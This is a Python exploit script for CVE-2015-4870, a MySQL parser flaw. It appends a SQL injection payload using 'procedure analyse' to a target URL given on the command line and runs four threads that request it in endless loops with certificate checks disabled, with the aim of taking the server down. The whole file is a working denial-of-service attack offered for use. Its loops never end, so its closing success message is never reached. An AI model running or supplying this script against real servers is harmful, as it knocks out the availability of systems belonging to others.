import argparse
from log_colors import *
import requests
import threading
import urllib.parse

class DoSReqThread(threading.Thread):
    headers = {
        "Accept" : '*/*',
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0",
        "Connection" : '',
        "Content-Type" : "text/html",
        }
    
    def __init__(self, tid, url):
        threading.Thread.__init__(self)
        self.tid = tid
        payload = " procedure analyse((select*from(select 1)x),1)-- -"
        self.url = url + payload
        self.session = requests.Session()

    # DoS request
    def run(self):
        while True:
            print (LogColors.BLUE + str(self.tid) + "->" + self.url + "..." + LogColors.ENDC)
            try:
                r = self.session.get(
                    self.url,
                    headers = self.headers, verify = False, timeout = 5,
                )
            except Exception as e:
                print (LogColors.RED + "error: " + str(e) + LogColors.ENDC)

# CVE-2015-4870 - Unspecified vulnerability in 
# Oracle MySQL Server 
# 5.5.45 and earlier, and 5.6.26 and earlier, 
# allows remote authenticated users to affect 
# availability via unknown vectors 
# related to Server : Parser.
class CVE2015_4870:
    
    # set target victim for DoS
    def __init__(self, url):
        self.url = url

    # exploiting
    def check_dos(self):
        threadLock = threading.Lock()
        threads = [DoSReqThread(j, self.url) for j in range(0, 4)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        print (LogColors.GREEN + "DoS successfully checked :)" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target url")
    args = vars(parser.parse_args())
    url = args['target']
    cve = CVE2015_4870(url)
    cve.check_dos()

